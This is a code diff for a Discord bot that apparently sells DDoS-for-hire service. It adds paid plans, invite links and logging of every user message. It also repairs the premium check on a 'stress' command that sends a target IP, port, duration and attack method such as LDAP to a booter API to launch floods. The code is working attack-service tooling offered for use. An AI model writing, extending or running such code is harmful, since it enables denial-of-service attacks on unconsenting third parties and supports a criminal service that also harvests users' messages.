@@ -6,6 +6,7 @@ const crud = require("./src/crud.js");
 const extra = require("./src/extra.js");
 const lulz = require("./src/boot_management");
 const { resolvePtr } = require('dns');
+const { stat } = require('fs');
 
 //Bot on ready.
 
@@ -18,6 +19,8 @@ client.on('ready', () => {
 //Command handler
 
 client.on('message', async (message) => {
+
+  config.CurrentMSG.Fullmsg = message.content;
 
   config.CurrentUser.Discord_name = message.author.tag;
   config.CurrentUser.Discord_id = message.author.id;
@@ -38,8 +41,10 @@ client.on('message', async (message) => {
     })
     config.CurrentMSG.Cmd = config.CurrentMSG.arg[0].replace(config.BotInfo.Prefix, "");
     //LOG COMMAND
+    extra.logger("cmd");
   } else {
     //LOG MESSAGE
+    extra.logger("msg");
   }
 
   if(message.content.startsWith(config.BotInfo.Prefix) && crud.isRegistered(config.CurrentUser.Discord_id)) {
@@ -47,21 +52,22 @@ client.on('message', async (message) => {
     if(message.content.startsWith(config.BotInfo.Prefix + "help")) { //FIRST COMMAND!
       // sendmsg("Help", "Help | Shows The List Of Commands\nMethods | Shows The List Of Methods\nCredits | Shows The Creators\n\n**Tools**\nGeo | Shows The Details Of An Ip Address\nPscan | Shows The Common Ports\n\n**Admin Commands**\nAddusr | Adds A User To The Database\nRemoveusr | Removes A User From The Database\nUpgradeusr | Upgrades A Users Plan")
       help();
-    } else if(message.content.startsWith(config.BotInfo.Prefix + "test")) {
-      if(crud.isAdmin(config.CurrentUser.Discord_id)) { 
-        bootembed("1.1.1.1", "80", "30", "LDAP", "Sent", "1/13/21-8:00pm");
-      } else {
-        sendmsg("Error", "Admin only command!");
-      }
     } else if(message.content.startsWith(config.BotInfo.Prefix + "myinfo")) {
       let get_info = crud.user(config.CurrentUser.Discord_id, "all");
       let info = get_info.split(",");
       sendmsg("My Info", "```User: " + info[0] + " | ID: " + info[1] + "\nLevel: " + info[2] + " | Maxtime: " + info[3] + " | Admin: " + info[4] + "```");
     } else if(message.content.startsWith(config.BotInfo.Prefix + "search")) {
       if(crud.isAdmin(config.CurrentUser.Discord_id)) {
-        let get_info = crud.user(config.CurrentMSG.arg[1], "all");
-        let info = get_info.split(",");
-        sendmsg("My Info", "```User: " + info[0] + " | ID: " + info[1] + "\nLevel: " + info[2] + " | Maxtime: " + info[3] + " | Admin: " + info[4] + "```");
+        let stat_type = config.CurrentMSG.arg[1];
+        let search_id = config.CurrentMSG.arg[2];
+        if(stat_type == "all") {
+          let get_info = crud.user(search_id, "all");
+          let info = get_info.split(",");
+          sendmsg("My Info", "```User: " + info[0] + " | ID: " + info[1] + "\nLevel: " + info[2] + " | Maxtime: " + info[3] + " | Admin: " + info[4] + "```");
+        } else {
+          let get_info = crud.user(search_id, stat_type);
+          sendmsg("My Info", get_info);
+        }
       } else {
         sendmsg("Error", "You aren't admin!");
       }
@@ -91,6 +97,8 @@ client.on('message', async (message) => {
           sendmsg("Methods", body);
         }
       });
+    } else if(message.content.startsWith(config.BotInfo.Prefix + "prices")) {
+      sendmsg("Prices", "m = Monthly | L = Llifetime\n\n$25/m\n$50/L\n\nVPNs coming soon!");
     } else if(message.content.startsWith(config.BotInfo.Prefix + "credits")) {
       sendmsg("Credits", "**Traumatized Security Team**\n\n**draco Social Media**\nInstagram | bizivix\nDiscord | draco#3024\n**GDK Scrapy Social Media**\nInstagram | gdkscrapy\nDiscord | GDK Scrapy#9431\n**WhosGotFrost Social Media**\nInstagram | whosgotfrost\nDiscord | WhosGotFrost#8041\n**Lag oh ye Social Media**\nDiscord | Lag oh ye#0001")
     } else if(message.content.startsWith(config.BotInfo.Prefix + "stress")) {
@@ -98,11 +106,11 @@ client.on('message', async (message) => {
       let port = config.CurrentMSG.arg[2];
       let time = config.CurrentMSG.arg[3];
       let method = config.CurrentMSG.arg[4];
-      if(crud.isPremium(config.CurrentMSG.Discord_id)) {
+      if(crud.isPremium(config.CurrentUser.Discord_id)) {
         if(message.content.split(" ").length < 4) {
           sendmsg("Error", "Missing arguments\nUsage: " + config.BotInfo.Prefix + "stress <ip> <port> <time>");
         } else {
-          fetch(config.BOOTERAPI + ip + "&port=" + port + "&time=" + time + "&method=" + method).then(res => res.text()).then(body => {
+          fetch(config.BOOTERAPI + ip + "&port=" + port + "&time=" + time + "&type=" + method).then(res => res.text()).then(body => {
             let resp = body;
             console.log(body);
             bootembed(ip, port, time, method, "True", extra.currentTime());
@@ -111,6 +119,10 @@ client.on('message', async (message) => {
       } else {
         sendmsg("Error", "You aren't premium!");
       }
+    } else if(message.content.startsWith(config.BotInfo.Prefix + "bot_inv")) {
+      sendmsg("Bot invite", "Spread out the bot by inviting it to your server! Link: " + config.BotInfo.Bot_Invite);
+    } else if(message.content.startsWith(config.BotInfo.Prefix + "server_inv")) {
+      sendmsg("Server Invite", config.BotInfo.Server_Invite);
     } else if(message.content.startsWith(config.BotInfo.Prefix + "admin")) {
       let tool = config.CurrentMSG.arg[1];
       let user_id = config.CurrentMSG.arg[2];
@@ -155,7 +167,7 @@ client.on('message', async (message) => {
 	    	{ name: 'Prices | Bot plans and link to buy now!', value: config.BotInfo.Prefix + 'prices'},
 	    	{ name: 'Methods | List of methods for premium users', value: config.BotInfo.Prefix + 'methods'},
 	    	{ name: 'Bot Invite | Invite this bot to your server', value: config.BotInfo.Prefix + 'bot_inv'},
-	    	{ name: "Traumatized's Server | Traumatized's Personal Server Invite", value: config.BotInfo.Prefix + 'myinvite'},
+	    	{ name: "Traumatized's Server | Traumatized's Personal Server Invite", value: config.BotInfo.Prefix + 'server_inv'},
 	    	{ name: "About | Credits and contact info", value: config.BotInfo.Prefix + 'credits'},
 	    	{ name: '\u200B', value: '\u200B' },
 	    	{ name: 'Admin | List of admin commands', value: config.BotInfo.Prefix + 'admincp'})
